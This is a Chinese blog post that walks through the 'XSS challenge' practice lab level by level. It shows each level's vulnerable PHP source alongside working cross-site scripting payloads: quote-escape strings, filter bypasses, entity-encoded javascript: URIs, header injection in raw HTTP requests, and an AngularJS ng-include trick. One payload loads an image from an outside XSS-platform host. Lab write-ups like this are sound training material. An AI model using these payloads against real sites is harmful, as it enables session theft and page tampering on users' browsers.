---
layout: post
title:  "xss挑战之旅"
date:   2020-12-03 21:09:21 +0800
categories: jekyll update
background: '/img/posts/07.jpeg'
---

# xss挑战之旅
很久以前就做过一遍了，没成功弹框就会提示完成并跳转到下一题，那个时候就觉得很神奇，服务器是如何知道我成功注入并执行了js代码呢，直到今天读了源码。。。
```js
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
```
原来是在前端做了判断，成功执行alert弹框就会用confirm函数弹框，然后用location跳转。。。

<br>
<br>
<br>

## 参考文献
[【巨人肩膀上的矮子】XSS挑战之旅---游戏通关攻略（更新至18关） - 先知社区](https://xz.aliyun.com/t/1206)

[XSS挑战之旅平台通关练习 - osc_4o5tc4xq的个人空间 - OSCHINA - 中文开源技术交流社区](https://my.oschina.net/u/4332632/blog/3374751)


<br>
<br>
<br>

## level-1
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
```

POC
```
<svg/onload=alert(1)>

<script>confirm(1)</script>

<script>prompt(1)</script>

<script>alert(1)</script>
```
另外，我在靶场html目录下又写了一个js文件xsshere.js，内容是  
```js
alert("xss.js in here");
```


<br>
<br>
<br>

## level-2
一上来就给我干蒙了，看了下html源码发现```'<''>'```被实体化了
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
```
可以看到在输出的时候对输入做了htmlspecialchars  
![show](/img/posts/08.png)
但是注意上面代码倒数第四行，将用户输入做了echo，这次并没有编码，所以这一题的利用点就在这里，通过闭合双引号，来逃逸  

POC
```
" onmouseover="alert(1)" "  
"/><script>alert(1)</script><"
```

<br>
<br>
<br>

## level-3
黑盒的时候发现除了单引号都被编码为实体了，所以还跟上一题一样在input标签里面逃逸  
```
' onmouseover='alert(1)' '
```
但是读了源码我反而疑惑了，因为htmlspecialchars明明是可以过滤掉单引号的不知道这里为什么没有起作用，而通过跟上一题比较就会发现，上一题使用双引号闭合的$str，而本题使用单引号闭合的，这就意味着作者本意应该也是用我的方法逃逸出来，可是为什么htmlspecialchars没有起作用呢？？？
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
```

<br>
<br>
<br>

## level-4
经测试发现input标签输出的地方没有过滤单引号和双引号  
![show](/img/posts/09.png)
```
" onmouseover="alert(1)" "
```
下面看源码
```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```
可以看到将大于小于两个符号全都做了替换为空的处理，h2做了htmlspecialchars就不管了，看下面input标签没有做任何处理，所以这一题只能通过双引号逃逸然后用属性来执行js代码，而无法像上面一样逃逸出input标签了  

<br>
<br>
<br>

## level-5

看源码  
```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```
接受keyword后进行小写，此时大小写绕过无效，接着对script、on都进行了替换，我找了很久，都没有找到能够在input标签里执行js代码同时名字里没有on的事件属性，哦还有一个autofocus属性，但autofocus也要借助onfocus才能生效  

绕过思路，先从value属性中逃逸，再从input标签中逃逸，最后利用一个非script标签中的属性执行js代码，实现利用  
```html
//
"><Img sRC=http://xss.pt/Y7wfp.jpg><"

//
"> <img src="javascript:alert(1);"/> <"

//
"> <a href="javascript:alert(1);">XSS</a><p "

```

<br>
<br>
<br>

## level-6
POC
```html
"><sCRipt>alert(1)</script>
```

<br>
<br>
<br>

## level-7
POC
```html
"><scrscriptipt>alert(1)</scrscriptipt>
```

下面看源码，对一些关键性的字符串做了替换为空的操作，直接双写绕过  
```php
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

<br>
<br>
<br>

## level-8
因为输出在了a标签的href属性里面，可以直接调用远程的html文件并执行其中的js代码
```html
xsshaha.html
```
或者将javascript进行html实体编码就可绕过  
```html
javasc&#x72;&#x69;pt:%61lert(8)
```

<br>
<br>
<br>

## level-9
经过一些测试加上页面本身的功能发现输入中必须含有http://这个字符串，除此之外也就是一些关键字添加了个下划线，哦还过滤了双引号，这其实还是蛮好绕过的。

首先测试得知并没有强制http://作为输入的开头，这就好办了，直接放到弹框内容里面即可。至于javascript过滤，如上题，html实体编码一下。
```html
javascr&#x69;pt:alert('1http://')
```
如果不想放到弹框内容里面，也可以创建一个变量，放到变量内容里面，相当于把http://给注释掉了。
```html
javascr&#x69;pt:alert(1);var test='http://'
```
也可以直接使用注释符
```html
javascrip&#x74;:alert(9)//http://
```
```html
javascrip&#x74;:alert(9)<!--http://-->
```


或者使用%0d来起到截断的作用
```html
javascrip&#x74;:%0dhttp://a.com%0dalert(9) 
```
因为%0d是回车的意思，所以笔者联想到换行符%0a，于是尝试，也同样成功了。虽然此时笔者并不了解具体是什么原理。
```html
javascrip&#x74;:%0ahttp://a.com%0aalert(9) 
```

<br>
<br>
<br>

## level-10

首先这一题是一定要看源码的，不然做不出来，除非fuzz参数，也不一定能fuzz出来。
```html
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```
输入简单测试语句，发现大于小于符号都被去空了，初次之外倒是没有做其他处理，但来作者是希望在input标签里面构建事件属性来弹框  
```html
keyword=1&t_sort=<'onscriptsrc">
```
于是直接在input标签里面构造事件属性  
```html
keyword=1&t_sort=" onmouseover="alert(1)" 
```
结果发现没有input框，一读html源码才发现后面还有一个hidden(作者的小心机)，只好自己再写一个text，然后注释掉后面的内容，浏览器自己会闭合标签的  
```html
keyword=1&t_sort=" onmouseover="alert(1)" type="text"//
```
看到网上有这样的，也行，原理是一样的，没有注释我猜是因为input只会取第一个同名属性的值，这也是为什么作者将hidden放在标签里最后面的位置，应该也是有这一层的考虑
```html
keyword=&t_sort=" type="text" onclick="alert()
```


<br>
<br>
<br>

## level-11

虽然心里清楚这一题大概和上一题解题思路，但还是先简单手动测试一下
```html
<'onscriptsrc">
然后不出意料，和上题一样，被htmlspecialchars过了
```
于是看了下源代码，很简单，跟上题基本一样，只是需要用burp来发个包了(不爱用hackbur)

```html
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

POC
```
GET /level11.php?keyword=1 HTTP/1.1
Host: 192.168.5.8:8091
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: " onmouseover="alert()" type="text
Connection: close
Upgrade-Insecure-Requests: 1
```
不解释了  


<br>
<br>
<br>

## level-12

猜到作者意思了，所以直接看源码  
```html
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```
直接上POC
```
GET /level12.php?keyword=good%20job! HTTP/1.1
Host: 192.168.5.8:8091
User-Agent: " onmouseover="alert()" type="text
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.5.8:8091/level11.php?keyword=1
Upgrade-Insecure-Requests: 1
```

<br>
<br>
<br>

## level-13
```html
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

可以看到是取cookie输出

但是访问页面会报错  
```
Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/level13.php:15) in /var/www/html/level13.php on line 16
```

一看16行就是setcookie函数，我猜应该是setcookie没有写在最前面的原因，又查了下setcookie的文档，初步印证了我的判断  

<br>
<br>
<img src="/img/posts/10.png" style="zoom:50%" align=center />
<br>
<br>

再节选报错语句，谷歌了一下，看人家的回答，基本就是这个问题了

<br>
<br>
<img src="/img/posts/11.png" style="zoom:50%" align=center />
<br>
<br>

到这里问题已经整明白了，我继续做这一题的性质也不高了，反正跟上一题原理是一样的，略吧。

<br>
<br>
<br>

## level-14


一看到level-14的界面，给我整蒙了，又去看了源码，感觉啥也没有啊，查了下资料才知道原来是exif插件问题，乌云有爆过 [WooYun-2016-194934-某Chrome Exif信息查看插件信息输出未处理可导致XSS（Zone测试为例）](https://wooyun.x10sec.org/static/bugs/wooyun-2016-0194934.html)，整体来说这个洞价值不大，虽然是存储型，但如果别人没有装这个插件也是白搭。而且多年前的漏洞到今天应该价值不大了，不过这倒是提醒了我可以关注下各种浏览器插件漏洞  

漏洞利用很简单，就是通过软件修改图片的一些基础信息，比如在照相机制造商和照相机型号的内容里面写如xsspayload，然后上传图片至网站，这是一种存储型xss，所以任何安装了chrome该版本的exif插件的用户查看了恶意图片都会受到xss攻击。

因为还要跳转到外网，巴拉巴拉一大堆就不做了，没意思  


<br>
<br>
<br>


## level-15
```html
<?php  
ini_set("display_errors", 0);  
$str = $_GET["src"];  
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';   
?>   
```

没从后段源码里看出些什么，看了下html源码。
```html
<head>
    <meta charset="utf-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js"></script>
<script>
```
这段调用引起了我的注意，为什么要调用这个js文件呢？不过我没放心上，折磨了好久之后终于去看writeup了，才发现这段代码还真就是绕过的核心。。。  

看一下这个js的概念吧  
```
ngularJS 是一个 JavaScript 框架。它可通过 <script> 标签添加到 HTML 页面。

AngularJS 通过 指令 扩展了 HTML，且通过 表达式 绑定数据到 HTML。

编写html文档的时候，为了实现代码模块化，增加复杂页面的代码可读性和可维护性，我们常常会想到将代码分散写入不同的HTML文件

angularJS里面的ng-include指令结合ng-controller能够很方便的实现这个目的

ng-include 指令用于包含外部的 HTML 文件。

ng-include可以作为一个属性，或者一个元素使用

AngularJS 我可以直接加载html和js代码了

AngularJS引入的html文件只能加载script标签内的代码。被引入的html 内如果有加载外部js的话是不会执行的
```
这个框架可以调用外部html文件并执行script标签里面的代码？那好办了。

看一下这个框架是怎么用的  
例  
```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<script src="https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js"></script>
</head>
<body ng-app="">
 
<div ng-include="'myFile.htm'"></div>
 
</body>
```
是不是意识到什么，通过给ng-include赋值的形式调用文件，刚好用户输出就在ng-include属性里面，所以直接调用level-1吧  

```html
//下面这个理论上是可以在firefox上跑的，因为firefox没有配置代理，好像访问不到这个js文件。
//无法在chrome上跑
src='level1.php?name=<script>alert()</script>'

//chrome上测试成功的，理论上firefox也能跑
src='level1.php?name=test<img src=1 onerror=alert(1)>'
```

就这样  
### 参考文献
[Angular Js XSS漏洞 - 灰信网（软件开发博客聚合）](https://www.freesion.com/article/5500383439/)

<br>
<br>
<br>

## level-16
```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("	","&nbsp;",$str4);
echo "<center>".$str5."</center>";
?>
```

因为过滤了script，所以无法用这个标签，过滤了空格意味着/代替不能用但可以用%0d来代替，
```html
<img%0dsrc=x%0donerror="alert(1)">
```

<br>
<br>
<br>

## level-17
```
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
```

一开始看到swf也是去查了下flash xss，可总觉得哪里不太对，知道看了别人的文章，才意识到swf根本就是个幌子，这一题要用事件属性去解   
```
arg01=a&arg02=b%20onmouseover=alert()
```

<br>
<br>
<br>

## level-18
```
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
```
本题与上一题唯一的区别就是引入的swf文件不一样，其余都是一样的，所以解法也是一样的  

```
arg01=a&arg02=b%20onmouseover=alert()
```

<br>
<br>
<br>

## level-19/20

因为是flash-xss，我电脑里没有flash，就不搞了

